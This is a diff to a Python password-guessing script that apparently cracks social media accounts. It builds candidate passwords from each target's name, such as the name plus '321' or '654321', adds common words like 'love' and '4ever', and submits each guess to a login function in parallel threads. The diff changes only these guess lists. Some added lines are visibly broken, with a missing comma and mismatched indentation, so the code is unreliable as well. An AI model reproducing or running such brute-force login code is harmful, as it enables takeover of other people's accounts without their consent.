@@ -215,11 +215,11 @@ def pilih_menu():
                 bb=aa[0].split(' ')
                 for x in bb:
                     litpas=[
-                         str(x) + '123',
-                         str(x) + '1234',
-                         str(x) + '12345',
-                         str(x) + '123456'
-                         str(x) + '567890'
+                         str(x) + '321',
+                         str(x) + '4321',
+                         str(x) + '54321',
+                         str(x) + '654321'
+                    
                          ]
                     litpas.append('love')
                     litpas.append('sempre')
@@ -250,15 +250,15 @@ def pilih_menu():
                 bb=aa[0].split(' ')
                 for x in bb:
                     litpas=[
-                         str(x) + '123',
-                         str(x) + '1234',
-                         str(x) + '12345',
-                         str(x) + '123456'
+                         str(x) + '321',
+                         str(x) + '4321',
+                         str(x) + '54321',
+                         str(x) + '654321'
                          ]
-                    litpas.append('Sayang')
-                    litpas.append('Bangsat')
-                    litpas.append('Kontol')
-                    litpas.append('Anjing')
+                    litpas.append('love')
+                    litpas.append('sempre')
+                    litpas.append('4ever')
+                    litpas.append('domin')
                     for passw in set(litpas):
                         ex.submit(login,(aa[1]),(passw))
        print('\n\033[00m[\033[96m*\033[00m]Done.')
@@ -282,16 +282,15 @@ def pilih_menu():
                   bb=aa[0].split(' ')
                   for x in bb:
                       litpas=[
-                           str(x) + '123',
-                           str(x) + '1234',
-                           str(x) + '12345',
-                           str(x) + '123456'
+                           str(x) + '321',
+                           str(x) + '4321',
+                           str(x) + '54321',
+                           str(x) + '654321'
                            ]
-                      litpas.append('Sayang')
-                      litpas.append('Bangsat')
-                      litpas.append('Kontol')
-                      litpas.append('Anjing')
-                      litpas.append('786786')
+                    litpas.append('love')
+                    litpas.append('sempre')
+                    litpas.append('4ever')
+                    litpas.append('domin')
                       for passw in set(litpas):
                           ex.submit(login,(aa[1]),(passw))
          print('\n\033[00m[\033[96m*\033[00m]Done.')
@@ -307,16 +306,15 @@ def pilih_menu():
                   bb=aa[0].split(' ')
                   for x in bb:
                       litpas=[
-                           str(x) + '123',
-                           str(x) + '1234',
-                           str(x) + '12345',
-                           str(x) + '123456'
+                           str(x) + '321',
+                           str(x) + '4321',
+                           str(x) + '54321',
+                           str(x) + '654321'
                            ]
-                      litpas.append('Sayang')
-                      litpas.append('Bangsat')
-                      litpas.append('Kontol')
-                      litpas.append('Anjing')
-                      litpas.append('786786')
+                    litpas.append('love')
+                    litpas.append('sempre')
+                    litpas.append('4ever')
+                    litpas.append('domin')
                       for passw in set(litpas):
                           ex.submit(login,(aa[1]),(passw))
          print('\n\033[00m[\033[96m*\033[00m]Done.')
@@ -337,11 +335,10 @@ def pilih_menu():
                            str(x) + '12345',
                            str(x) + '123456'
                            ]
-                      litpas.append('Sayang')
-                      litpas.append('Bangsat')
-                      litpas.append('Kontol')
-                      litpas.append('Anjing')
-                      litpas.append('786786')
+                    litpas.append('love')
+                    litpas.append('sempre')
+                    litpas.append('4ever')
+                    litpas.append('domin')
                       for passw in set(litpas):
                           ex.submit(login,(aa[1]),(passw))
          print('\n\033[00m[\033[96m*\033[00m]Done.')
@@ -356,15 +353,15 @@ def pilih_menu():
                   bb=aa[0].split(' ')
                   for x in bb:
                       litpas=[
-                           str(x) + '123',
-                           str(x) + '1234',
-                           str(x) + '12345',
-                           str(x) + '123456'
+                           str(x) + '321',
+                           str(x) + '4321',
+                           str(x) + '54321',
+                           str(x) + '654321'
                            ]
-                      litpas.append('Sayang')
-                      litpas.append('Bangsat')
-                      litpas.append('Kontol')
-                      litpas.append('Anjing')
+                    litpas.append('love')
+                    litpas.append('sempre')
+                    litpas.append('4ever')
+                    litpas.append('domin')
                       for passw in set(litpas):
                           ex.submit(login,(aa[1]),(passw))
          print('\n\033[00m[\033[96m*\033[00m]Done.')
